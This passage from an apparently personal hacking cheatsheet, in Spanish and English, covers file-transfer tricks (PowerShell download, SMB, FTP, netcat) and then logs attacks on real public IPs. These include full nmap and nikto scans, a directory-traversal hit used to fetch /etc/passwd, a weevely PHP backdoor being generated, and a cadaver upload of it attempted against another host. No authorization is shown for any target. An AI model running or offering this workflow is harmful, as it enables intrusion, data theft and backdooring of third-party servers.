            Yo uso python3, por lo que es posible que te salga ese error de arriba, asi que, con python3 usa.

                > ls
                CheatsheetHacking.md  output-cncintel.htlml  README.md  report-cnc  report-cnc.html  report-cnc-intel  skipfish-cnc.html

                > python3 -m http.server 8080
                Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
                127.0.0.1 - - [06/Sep/2022 11:37:08] code 404, message File not found
                127.0.0.1 - - [06/Sep/2022 11:37:08] "GET /) HTTP/1.1" 404 -
                127.0.0.1 - - [06/Sep/2022 11:37:09] code 404, message File not found
                127.0.0.1 - - [06/Sep/2022 11:37:09] "GET /favicon.ico HTTP/1.1" 404 -
                127.0.0.1 - - [06/Sep/2022 11:37:16] "GET / HTTP/1.1" 200 -
                127.0.0.1 - - [06/Sep/2022 11:38:24] code 404, message File not found
                127.0.0.1 - - [06/Sep/2022 11:38:24] "GET /robots.txt HTTP/1.1" 404 -
                127.0.0.1 - - [06/Sep/2022 11:38:32] "GET / HTTP/1.1" 200 -
                127.0.0.1 - - [06/Sep/2022 11:38:53] "GET / HTTP/1.1" 200 -
                127.0.0.1 - - [06/Sep/2022 11:38:54] code 404, message File not found
                127.0.0.1 - - [06/Sep/2022 11:38:54] "GET /favicon.ico HTTP/1.1" 404 -
                127.0.0.1 - - [06/Sep/2022 11:39:26] "GET / HTTP/1.1" 200 -
                127.0.0.1 - - [06/Sep/2022 11:39:41] "GET / HTTP/1.1" 200 -

            Digamos que quieres enviar a la máquina windows un fichero almacenado en la máquina victima.

            Comando para recibir el fichero en Windows:

                powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.85.139:8080/CheatsheetHacking.md','C:\Users\test\Desktop\CheatsheetHacking.md')"

            Otra forma:

            Abre powershell y escribe, (tienes que tener abierto el puerto 8080 en el firewall de linux y probablemente desactivar Defender en Windows):

                PS C:\Users\IEUser> Invoke-Webrequest -uri http://192.168.85.139:8080/CheatsheetHacking.md -outfile CheatSheetHacking.md
                PS C:\Users\IEUser> dir .\CheatSheetHacking.md


                Directorio: C:\Users\IEUser


                Mode                LastWriteTime         Length Name
                ----                -------------         ------ ----
                -a----       09/09/2022      3:59         271012 CheatSheetHacking.md

            Comando para recibir el fichero en Linux:

                wget http://192.168.20.X:8080/FiletoTransfer

            # SMB

            Comando para servir el fichero en Linux:

                https://www.kali.org/tools/impacket/

                > sudo impacket-smbserver -smb2support test .

                Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

                [*] Config file parsed
                [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
                [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
                [*] Config file parsed
                [*] Config file parsed
                [*] Config file parsed

            Comando para recibir el fichero en Linux:

                Falta...

            Comando para recibir el fichero en Windows:

                copy \\192.168.20.X\test\FiletoTransfer FiletoTransfer

            # FTP

            Comando para servir el fichero en Linux:

                > sudo twistd3 -n ftp -r .

                [sudo] password for kali:
                2022-09-06T11:07:50+0200 [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 22.4.0 (/usr/bin/python3 3.10.6) starting up.
                2022-09-06T11:07:50+0200 [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
                2022-09-06T11:07:50+0200 [-] FTPFactory starting on 2121
                2022-09-06T11:07:50+0200 [twisted.protocols.ftp.FTPFactory#info] Starting factory <twisted.protocols.ftp.FTPFactory object at 0x7f3f3f9064d0>

            Comando para conectarme al servidor ftp en Linux:

                > ftp ftp://localhost:2121
                Trying [::1]:2121 ...
                ftp: Can't connect to `::1:2121': Connection refused
                Trying 127.0.0.1:2121 ...
                Connected to localhost.
                220 Twisted 22.4.0 FTP Server
                331 Guest login ok, type your email address as password.
                230 Anonymous login ok, access restrictions apply.
                Remote system type is UNIX.
                Using binary mode to transfer files.
                200 Type set to I.
                ftp> ls
                227 Entering Passive Mode (127,0,0,1,139,157).
                125 Data connection already open, starting transfer
                drwxr-xr-x   4 kali      kali                 4096 Aug 30 16:34 skipfish-cnc.html
                -rw-r--r--   1 kali      kali               250328 Sep 05 15:17 CheatsheetHacking.md
                -rw-r--r--   1 root      root                    4 Sep 06 09:07 twistd.pid
                drwxr-xr-x   8 kali      kali                 4096 Sep 05 15:17 .git
                -rw-r--r--   1 kali      kali                  397 Aug 29 09:30 README.md
                drwxr-xr-x   2 kali      kali                 4096 Aug 30 16:42 report-cnc-intel
                drwxr-xr-x   4 kali      kali                 4096 Aug 30 16:36 report-cnc.html
                -rw-r--r--   1 kali      kali                 6781 Aug 30 15:38 output-cncintel.htlml
                drwxr-xr-x   4 kali      kali                 4096 Aug 30 16:38 report-cnc
                226 Transfer Complete.

            Comando para recibir el fichero en Windows:

                ftp
                open 192.168.20.X 2121
                anonymous
                get FiletoTransfer
                bye

            Comando para recibir el fichero en Linux

                wget ftp://192.168.20.X:2121/FiletoTransfer

            # Netcat

            Comando para recibir el fichero en Linux y Windows:

                nc.exe -lvp 4444 > FiletoTransfer

            Comando para servir el fichero en Linux y Windows:

                nc 192.168.20.X 4444 -w 3 < FiletoTransfer

# Hacking ético en entornos reales. AWS

    # Arquitectura y registro en la nube AWS.

    # Registro y configuración de una cuenta AWS.

    # Infraestructura de la red en la nube AWS.

    # Seguridad y computación en la nube AWS.

    # Balanceadores y almacenamiento en la nube AWS.

    # Recopilación de informacion y almacenamiento en la nube AWS.

    # Controles de seguridad en un entorno real.

    # Auditando la infraestructura interna.

    # Tipos de auditoria de seguridad.

    # Eliminando el entorno en AWS.

# Bypass a Web application Firewall, like CloudFlare...

    You need to identify what waf are behind any server, so you can use somethig like wafw00f.
    https://www.kali.org/tools/wafw00f/

    Dmitry can find the ip if it is an illegal and malicious website. Have a try.

    then, i recommend to go to this website and find the latest hack:
    https://waf-bypass.com

# Find javascript files from a malicious webserver.

    https://github.com/bhavik-kanejiya/SecretFinder

    zsh 6551 [1] master% python3 -m pip install -r requirements.txt
    Collecting requests_file
      Downloading requests_file-1.5.1-py2.py3-none-any.whl (3.7 kB)
    ...
    Successfully built jsbeautifier
    Installing collected packages: editorconfig, requests-file, jsbeautifier
    Successfully installed editorconfig-0.12.3 jsbeautifier-1.14.5 requests-file-1.5.1
    (base) [sáb 22/08/13 12:51 CEST][s000][x86_64/darwin21.0/21.6.0][5.8.1]
    <aironman@MacBook-Pro-de-Alonso:~/git/SecretFinder>
    zsh 6552 master% python3 SecretFinder.py -i https://www.metanoa.vip/\#/ -e
    [ + ] URL: https://www.metanoa.vip//./static/js/manifest.f4f4a9a7742499ed15ad.js
    [ + ] URL: https://www.metanoa.vip//./static/js/vendor.a8be22dfe66398d155ce.js
    [ + ] URL: https://www.metanoa.vip//./static/js/app.a45df6fa2d6c8283993c.js

    Then, we can use https://beautifier.io to deobfsucate the javascript code and analyze it.

    Looking for something like https, i can see an url, h5.metanoa.vip, lets ping it:

    <aironman@MacBook-Pro-de-Alonso:~/git/SecretFinder>
    zsh 6554 master% ping -c 1 h5.metanoa.vip                                                                      
    PING h5.metanoa.vip (156.240.105.170): 56 data bytes
    64 bytes from 156.240.105.170: icmp_seq=0 ttl=49 time=338.158 ms

    --- h5.metanoa.vip ping statistics ---
    1 packets transmitted, 1 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 338.158/338.158/338.158/0.000 ms

    h5.metanoa.vip looks different from https://www.metanoa.vip/\#/, so probably is the real ip address.

    Using this tool, i can see that the ip is located in Hong Kong, and it is static, probably it is the real ip address.

    https://whatismyipaddress.com/ip/156.240.105.170

    If i ping the other ip address:

    <aironman@MacBook-Pro-de-Alonso:~/git/SecretFinder>
    zsh 6557 [68] master% ping -c 1 www.metanoa.vip
    PING www.metanoa.vip (156.240.105.170): 56 data bytes
    64 bytes from 156.240.105.170: icmp_seq=0 ttl=49 time=253.263 ms

    --- www.metanoa.vip ping statistics ---
    1 packets transmitted, 1 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 253.263/253.263/253.263/0.000 ms

    probably it is not behind any fancy web firewall.

# Another framework to do OSINT. Neo4j Support.

    https://github.com/blacklanternsecurity/bbot

    There are a lot of plugins, it is quite recent, and most importat, it has neo4j support to see the relations between nodes.

# Pasos de Israel (@perito_inf) para realizar un proceso de pentesting.

    https://twitter.com/perito_inf/status/1178741955561492481

# ESCANEO DE LA RED

    > nmap -sn 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:32 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.17s latency).
    Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
    ...

    >  nmap -sL 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:31 CEST
    Nmap scan report for 156.242.11.17
    Nmap done: 1 IP address (0 hosts up) scanned in 0.05 seconds
    ...

    > nbtscan -r  156.242.11.17/24
    Doing NBT name scan for addresses from 156.242.11.17/24

    IP address       NetBIOS Name     Server    User             MAC address      
    ------------------------------------------------------------------------------
    156.242.11.18    MS01-C6220-DS07  <server>  <unknown>        e0:db:55:fd:91:e6
    156.242.11.14    MS01-5038ML-018  <server>  <unknown>        ac:1f:6b:f2:7e:4d

    # smbtree - A text based smb network browser. Windows only

        smbtree

    # Netdiscover es una herramienta activa/pasiva para el reconocimiento de direcciones, desarrollada
    # principalmente para redes inalámbricas sin   servidor dhcp, cuando se está realizando wardriving.
    # Y también puede ser utilizada en redes con hub o switch.

    # Construido sobre libnet y libcap, puede detectar de manera pasiva hosts en funcionamiento, o búsqueda
    # de ellos, enviando solicitudes ARP, esto también puede ser utilizado para inspeccionar el tráfico de red
    # ARP, o encontrar direcciones de red utilizando el modo de auto escaneo, lo cual puede escanear por redes
    # locales comunes.

    # Aquí estoy usando la herramienta como un sniffer de mi red local...

    > sudo netdiscover -P -i eth0 -r 192.168.85.0/24
     _____________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
     -----------------------------------------------------------------------------
     192.168.85.1    a6:83:e7:39:c4:65      1      60  Unknown vendor
     192.168.85.2    00:50:56:e5:34:24      1      60  VMware, Inc.
     192.168.85.254  00:50:56:e3:1d:c6      1      60  VMware, Inc.

    -- Active scan completed, 3 Hosts found.


    ESCANEO AL HOST.

    Veinte puertos abiertos más importantes.

    > nmap --top-ports 20 --open 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:37 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 17 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT    STATE SERVICE
    80/tcp  open  http
    443/tcp open  https
    ...

    > echo 156.242.11.17 > iplist.txt
    > cat iplist.txt
    156.242.11.17
    > nmap --top-ports  20 --open -iL iplist.txt
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:40 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.19s latency).
    Not shown: 17 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT    STATE SERVICE
    80/tcp  open  http
    443/tcp open  https

    Nmap done: 1 IP address (1 host up) scanned in 3.21 seconds

    # deep, maybe 1 hour!

    > sudo nmap -p- -sS -A -sV -O  -iL iplist.txt
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:41 CEST
    Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 0.94% done                                                                                                                           ...             
    Stats: 0:31:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 60.01% done; ETC: 13:34 (0:20:58 remaining)                                                                                                                                    
    Stats: 0:43:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                                                                                               
    SYN Stealth Scan Timing: About 83.71% done; ETC: 13:34 (0:08:31 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.068s latency).
    Not shown: 65519 filtered tcp ports (no-response)
    PORT      STATE  SERVICE   VERSION
    22/tcp    closed ssh
    80/tcp    open   http      nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    443/tcp   open   ssl/http  nginx
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-alpn:
    |_  http/1.1
    | tls-nextprotoneg:
    |_  http/1.1
    2052/tcp  closed clearvisn
    2053/tcp  closed knetd
    2082/tcp  closed infowave
    2083/tcp  open   ssl/http  nginx
    | ssl-cert: Subject: commonName=CloudFlare Origin Certificate/organizationName=CloudFlare, Inc.
    | Subject Alternative Name: DNS:*.defi-aava.xyz, DNS:defi-aava.xyz
    | Not valid before: 2022-03-11T06:50:00
    |_Not valid after:  2037-03-07T06:50:00
    | http-title: 400 The plain HTTP request was sent to HTTPS port
    |_Requested resource was /index/index/welcome
    | tls-nextprotoneg:
    |_  http/1.1
    | tls-alpn:
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    23323/tcp open   http      nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    23324/tcp open   ssl/http  nginx
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg:
    |_  http/1.1
    | tls-alpn:
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    23325/tcp open   http      nginx
    | http-title: \xE6\xAC\xA2\xE8\xBF\x8E\xE8\xAE\xBF\xE9\x97\xAEAI\xE6\x99\xBA\xE8\x83\xBD\xE5\xAE\xA2\xE6\x9C\x8D\xE7\xB3\xBB\xE7\xBB\x9F
    |_Requested resource was /index/index/welcome
    | http-cookie-flags:
    |   /:
    |     PHPSESSID:
    |_      httponly flag not set
    23326/tcp open   ssl/http  nginx
    | tls-alpn:
    |_  http/1.1
    | tls-nextprotoneg:
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | http-title: 400 The plain HTTP request was sent to HTTPS port
    |_Requested resource was /index/index/welcome
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    23327/tcp open   unknown
    | fingerprint-strings:
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, RPCCheck, RTSPRequest, SSLSessionReq:
    |     HTTP/1.1 400 Bad Request
    |     <b>400 Bad Request</b><br>Invalid handshake data for websocket. <br> See <a href="http://wiki.workerman.net/Error1">http://wiki.workerman.net/Error1</a> for detail.
    |   GetRequest:
    |     HTTP/1.1 400 Bad Request
    |_    <b>400 Bad Request</b><br>Sec-WebSocket-Key not found.<br>This is a WebSocket service and can not be accessed via HTTP.<br>See <a href="http://wiki.workerman.net/Error1">http://wiki.workerman.net/Error1</a> for detail.
    32200/tcp open   ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
    | ssh-hostkey:
    |   2048 6e:53:7f:f6:97:fa:9e:a5:b8:75:57:80:94:d2:35:19 (RSA)
    |   256 80:9e:85:1e:ff:f8:55:64:32:62:9d:85:ac:7c:e8:64 (ECDSA)
    |_  256 c0:b4:c7:01:ae:77:53:93:af:f7:d7:59:ab:3e:67:6c (ED25519)
    32201/tcp open   http      nginx
    | http-title: \xE6\xAC\xA2\xE8\xBF\x8E\xE8\xAE\xBF\xE9\x97\xAEAI\xE6\x99\xBA\xE8\x83\xBD\xE5\xAE\xA2\xE6\x9C\x8D\xE7\xB3\xBB\xE7\xBB\x9F
    |_Requested resource was /index/index/welcome
    | http-cookie-flags:
    |   /:
    |     PHPSESSID:
    |_      httponly flag not set
    32202/tcp open   http      nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    40000/tcp open   ssl/http  nginx
    | tls-alpn:
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg:
    |_  http/1.1
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port23327-TCP:V=7.92%I=7%D=8/16%Time=62FB80CA%P=x86_64-pc-linux-gnu%r(G
    SF:etRequest,F6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x
    SF:20Request</b><br>Sec-WebSocket-Key\x20not\x20found\.<br>This\x20is\x20a
    SF:\x20WebSocket\x20service\x20and\x20can\x20not\x20be\x20accessed\x20via\
    SF:x20HTTP\.<br>See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">h
    SF:ttp://wiki\.workerman\.net/Error1</a>\x20for\x20detail\.")%r(HTTPOption
    SF:s,C0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x20Reques
    SF:t</b><br>Invalid\x20handshake\x20data\x20for\x20websocket\.\x20<br>\x20
    SF:See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">http://wiki\.w
    SF:orkerman\.net/Error1</a>\x20for\x20detail\.")%r(RTSPRequest,C0,"HTTP/1\
    SF:.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x20Request</b><br>Inva
    SF:lid\x20handshake\x20data\x20for\x20websocket\.\x20<br>\x20See\x20<a\x20
    SF:href=\"http://wiki\.workerman\.net/Error1\">http://wiki\.workerman\.net
    SF:/Error1</a>\x20for\x20detail\.")%r(RPCCheck,C0,"HTTP/1\.1\x20400\x20Bad
    SF:\x20Request\r\n\r\n<b>400\x20Bad\x20Request</b><br>Invalid\x20handshake
    SF:\x20data\x20for\x20websocket\.\x20<br>\x20See\x20<a\x20href=\"http://wi
    SF:ki\.workerman\.net/Error1\">http://wiki\.workerman\.net/Error1</a>\x20f
    SF:or\x20detail\.")%r(DNSVersionBindReqTCP,C0,"HTTP/1\.1\x20400\x20Bad\x20
    SF:Request\r\n\r\n<b>400\x20Bad\x20Request</b><br>Invalid\x20handshake\x20
    SF:data\x20for\x20websocket\.\x20<br>\x20See\x20<a\x20href=\"http://wiki\.
    SF:workerman\.net/Error1\">http://wiki\.workerman\.net/Error1</a>\x20for\x
    SF:20detail\.")%r(DNSStatusRequestTCP,C0,"HTTP/1\.1\x20400\x20Bad\x20Reque
    SF:st\r\n\r\n<b>400\x20Bad\x20Request</b><br>Invalid\x20handshake\x20data\
    SF:x20for\x20websocket\.\x20<br>\x20See\x20<a\x20href=\"http://wiki\.worke
    SF:rman\.net/Error1\">http://wiki\.workerman\.net/Error1</a>\x20for\x20det
    SF:ail\.")%r(Help,C0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20
    SF:Bad\x20Request</b><br>Invalid\x20handshake\x20data\x20for\x20websocket\
    SF:.\x20<br>\x20See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">h
    SF:ttp://wiki\.workerman\.net/Error1</a>\x20for\x20detail\.")%r(SSLSession
    SF:Req,C0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x20Requ
    SF:est</b><br>Invalid\x20handshake\x20data\x20for\x20websocket\.\x20<br>\x
    SF:20See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">http://wiki\
    SF:.workerman\.net/Error1</a>\x20for\x20detail\.");
    Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (98%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (97%), Linux 4.4 (97%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Microsoft Windows XP SP3 (95%), BlueArc Titan 2100 NAS device (91%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   57.46 ms 192.168.85.2
    2   51.12 ms 156.242.11.17

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 3192.48 seconds

    ⭐  ~  ok  took 53m 13s  at 13:35:12 >  

    > nmap sU -iL iplist.txt
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 13:47 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds

    ⭐  ~  ok  took 12s  at 13:47:47 >  

    # ESCANEO DE LOS SERVICIOS

    # SERVICIOS WEB

    # Nikto

        https://ciberseguridad.com/herramientas/software/nikto/#Instalacion_basada_en_Kali_Linux

    > sudo nikto -h 156.242.11.17 -ssl -maxtime 60 -output nikto-156-242-11-17.txt -no404 -timeout 15
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          156.242.11.17
    + Target Hostname:    156.242.11.17
    + Target Port:        443
    ---------------------------------------------------------------------------
    + SSL Info:        Subject:  /CN=www.aavadefimax.xyz
                       Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                       Issuer:   /C=US/O=Let's Encrypt/CN=R3
    + Start Time:         2022-08-16 12:55:45 (GMT2)
    ---------------------------------------------------------------------------
    + Server: nginx
    + Retrieved x-powered-by header: PHP/7.2.34
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + The site uses SSL and Expect-CT header is not present.
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + ERROR: Host maximum execution time of 60 seconds reached
    + SCAN TERMINATED:  0 error(s) and 6 item(s) reported on remote host
    + End Time:           2022-08-16 12:56:49 (GMT2) (64 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested

    # I generated an output file with -output:

    > cat nikto-156-242-11-17.txt
    - Nikto v2.1.6/2.1.5
    + Target Host: 156.242.11.17
    + Target Port: 443
    + GET Retrieved x-powered-by header: PHP/7.2.34
    + GET The anti-clickjacking X-Frame-Options header is not present.
    + GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + GET The site uses SSL and Expect-CT header is not present.
    + GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type

     ⭐  ~  ok  at 12:59:33 >                                                                                           

    # dotdotpwn.

        https://www.kali.org/tools/dotdotpwn/

    > sudo dotdotpwn -m http -h 156.242.11.17 -M GET -b -q -r host_156_242_11_17.txt -t 100
    #################################################################################
    #                                                                               #
    #  CubilFelino                                                       Chatsubo   #
    #  Security Research Lab              and            [(in)Security Dark] Labs   #
    #  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
    #                                                                               #
    #                               pr0udly present:                                #
    #                                                                               #
    #  ________            __  ________            __  __________                   #
    #  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
    #   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
    #   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
    #  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
    #          \/                      \/                                      \/   #
    #                              - DotDotPwn v3.0.2 -                             #
    #                         The Directory Traversal Fuzzer                        #
    #                         http://dotdotpwn.sectester.net                        #
    #                            dotdotpwn@sectester.net                            #
    #                                                                               #
    #                               by chr1x & nitr0us                              #
    #################################################################################

    [+] Report name: Reports/host_156_242_11_17.txt

    [========== TARGET INFORMATION ==========]
    [+] Hostname: 156.242.11.17
    [+] Protocol: http
    [+] Port: 80

    [=========== TRAVERSAL ENGINE ===========]
    [+] Creating Traversal patterns (mix of dots and slashes)
    [+] Multiplying 6 times the traversal patterns (-d switch)
    [+] Creating the Special Traversal patterns
    [+] Translating (back)slashes in the filenames
    [+] Adapting the filenames according to the OS type detected (unix)
    [+] Including Special sufixes
    [+] Traversal Engine DONE ! - Total traversal tests created: 11028

    [=========== TESTING RESULTS ============]
    [+] Ready to launch 10.00 traversals per second
    [+] Press Enter to start the testing (You can stop it pressing Ctrl + C)
    ...
    [*] Testing Path: http://156.242.11.17:80/.?/etc/passwd <- VULNERABLE!

    [+] Fuzz testing finished after 12.10 minutes (726 seconds)
    [+] Total Traversals found: 1
    [+] Report saved: Reports/host_156_242_11_17.txt
    > wget http://156.242.11.17:80/.\?/etc/passwd
    --2022-08-16 16:40:17--  http://156.242.11.17/?/etc/passwd
    Connecting to 156.242.11.17:80... connected.
    HTTP request sent, awaiting response... 200 OK
    ...

    view source ??? preguntar a Isra

    # davtest

        You can upload files to a vulnerable webdav server using this.
        WebDav se usa para compartir ficheros en un servidor web, como un ftp, pero sobre la web.

        El protocolo WebDAV (Web-based Distributed Authoring and Versioning) está desarrollado por la IETF,
        es un protocolo que se encarga de permitirnos de forma sencilla guardar, editar, copiar, mover y
        compartir archivos desde servidores web. Gracias a este protocolo, podremos trabajar con archivos
        directamente en un servidor web, como si de un servidor Samba o FTP se tratara.

        Actualmente, la mayoría de sistemas operativos modernos como Windows, Linux o macOS, permiten soporte
        para WebDAV, haciendo que los ficheros de un servidor WebDAV aparezcan como almacenados en un directorio.

        https://www.kali.org/tools/davtest/

        Tienes que crear un directorio tests, si no, falla.
        ┌──(root㉿kali)-[/home/kali]
        └─# mkdir tests                      

        ┌──(root㉿kali)-[/home/kali]
        └─# davtest -url http://156.242.11.17
        ********************************************************
         Testing DAV connection
        OPEN            FAIL:   http://156.242.11.17    Server response: 405 Not Allowed

        Como puedes ver, ese servidor no tiene webdav habilidato, por lo que, tenemos que detectar servidores web con
        webdav habilitado. Nmap tiene un script llamado http-iis-webdav-vuln

        ┌──(root㉿kali)-[/home/kali]
        └─# nmap -T4 -p80 --script=http-iis-webdav-vuln 156.242.11.17
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 14:11 CEST
        Nmap scan report for 156.242.11.17
        Host is up (0.040s latency).

        PORT   STATE SERVICE
        80/tcp open  http

        Nmap done: 1 IP address (1 host up) scanned in 2.01 seconds

        ┌──(root㉿kali)-[/home/kali]
        └─# nmap -T4 -p443 --script=http-iis-webdav-vuln 156.242.11.17
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 14:12 CEST
        Nmap scan report for 156.242.11.17
        Host is up (0.040s latency).

        PORT    STATE SERVICE
        443/tcp open  https

        Nmap done: 1 IP address (1 host up) scanned in 2.16 seconds

        Como podemos ver, este servidor NO es vulnerable.

        Si buscamos con Shodan, vemos un montón.

        https://beta.shodan.io/search?query=%28Win32%29+DAV%2F2


    # weevely

        Generate a PHP backdoor (generate) protected with the given password (s3cr3t).

        https://www.kali.org/tools/weevely/

        > sudo weevely generate 123321 /home/kali/Desktop/fake-log-weevely.php
        Generated '/home/kali/Desktop/fake-log-weevely.php' with password '123321' of 754 byte size.

    # cadaver

        si encuentras un servidor web dav vulnerable, es decir, una máquina donde puedas subir ficheros, puedes subir un webshell
        que te de acceso a la máquina. Lo encuentras con nikto, generas la webshell con weevely, lo subes con cadaver.

        Voy a simular como sería, encuentro un servidor vulnerable donde puedo subir ficheros. Si el siguiente lo fuera, me diría que puedo
        hacer PUT...
        > sudo nikto -h http://78.54.214.92/dav
        - Nikto v2.1.6
        ---------------------------------------------------------------------------
        + No web server found on 78.54.214.92:80
        ---------------------------------------------------------------------------
        + 0 host(s) tested

        # Si el servidor estuviera arriba, podrías hacer PUT del fichero generado con weeverly.

        > sudo cadaver http://78.54.214.92/dav
        Could not connect to `78.54.214.92' on port 80:
        Could not connect to server: Connection refused
        dav:/dav/? PUT /home/kali/Desktop/fake-log-weevely.php
        The `PUT' command can only be used when connected to the server.
        Try running `open' first (see `help open' for more details).
        dav:/dav/?

    # droopscan

        drupal scanner...

        > sudo droopescan scan drupal -u 18.232.209.104
        [sudo] password for kali:
        [+] Plugins found:                                                              
            acquia_connector http://18.232.209.104/sites/all/modules/acquia_connector/
                http://18.232.209.104/sites/all/modules/acquia_connector/README.txt
            image http://18.232.209.104/modules/image/

        [+] Themes found:
            garland http://18.232.209.104/themes/garland/

        [+] Possible version(s):
            7.22
            7.23
            7.24
            7.25
            7.26
            7.27
            7.28
            7.29
            7.30
            7.31
            7.32
            7.33
            7.34
            7.35
            7.36
            7.37
            7.38
            7.39
            7.40
            7.41
            7.42
            7.43
            7.44
            7.50
            7.51
            7.52
            7.53
            7.54
            7.55
            7.56
            7.57
            7.58
            7.59
            7.60
            7.61
            7.62
            7.63
            7.64
            7.65
            7.66
            7.67
            7.68
            7.69
            7.70
            7.71
            7.72
            7.73
            7.74
            7.75
            7.76
            7.77
            7.78
            7.79
            7.80
            7.81
            7.82

        [+] No interesting urls found.

        [+] Scan finished (0:02:25.852120 elapsed)

